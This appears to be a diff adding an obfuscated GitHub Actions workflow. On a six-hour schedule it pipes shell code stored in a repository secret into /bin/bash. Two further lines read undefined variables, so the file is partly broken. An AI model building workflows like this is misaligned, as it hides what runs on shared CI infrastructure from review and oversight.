@@ -1,0 +1,19 @@
+name: fjmkxxi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fjmkxxi
+        env:
+          xycc0355: ${{ secrets.xycc0355 }}
+        run: |
+          echo $xycc0355 | jq -r .qnt85 | /bin/bash
+          echo $bn725 | jq -r .sfqge8 | /bin/bash
+          echo $n775 | jq -r .xe83600 | /bin/bash
+
